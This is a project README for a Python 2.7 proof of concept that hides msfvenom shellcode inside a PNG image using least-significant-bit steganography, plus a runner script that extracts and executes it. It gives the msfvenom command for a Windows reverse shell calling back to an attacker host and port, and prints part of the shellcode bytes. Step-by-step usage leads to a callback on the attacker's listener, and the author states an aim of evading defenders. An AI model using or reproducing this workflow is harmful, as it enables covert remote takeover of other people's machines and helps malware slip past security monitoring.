# PyStegMalz
Python 2.7 script that uses LSB steganography to host your shellcode payloads from within a image, and a corresponding script to decode & execute the shellcode. This was a POC created as an pure experiement with defence-evasion not being the focus. However, this project will be updated continously to improve OPSEC & hopefully be a technqiue to evade the blue-team!

There are two scripts: 
`encoder.py` & `shellcode_runner.py`
For a very detailed explanation of this POC pleases check out my corresponding blog post:

https://polygonben.github.io/defence%20evasion/Creating-Stego-payloads/

## Instructions for use
### Generating shellcode.

For this POC I'll generate a simple reverse-shell. Let's generate the corresponding shellcode in msfvenom:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.123 LPORT=4444 -f py`

The shellcode generated will look something like this (this precise shellcode can be found in this repo as `shellcode.txt`):

```
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
buf += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
...
buf += b"\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2"
buf += b"\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
buf += b"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d"
buf += b"\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
buf += b"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
buf += b"\x89\xda\xff\xd5"
```
Copy the contents of the shellcode, like above, into a text file and save it! Please ensure the first line, `buf = b""`, is included.

### Picking an image

For this part you can be creative, choose a fairly large image to ensure there is enough space to encode your shellcode. Save this to the same directory you put your shellcode text file in. 

If you are just playing around with this, `example.png` from this repo works well!

### Encoding

`encoder.py -s shellcode.txt -i example.png`

Expected output should be: 'Payload encoded and image saved to: poc_example.png'

However, if you recieve: 'Data too large for the image.' -> Choose a larger image!

You can view this payload encoded image and you'll barely notice a change between the two.

### POC demo

https://polygonben.github.io/defence%20evasion/Creating-Stego-payloads/#poc-live-demo

## Execution

Execution should be simple, just edit the `encoded_image_path` variable in the `shellcode_runner.py` script to be the filename (or path), in my case `poc_example.png` and execute the script! If you've got a listener going on the attacking box, after executing the Python script you should get a call back! :)
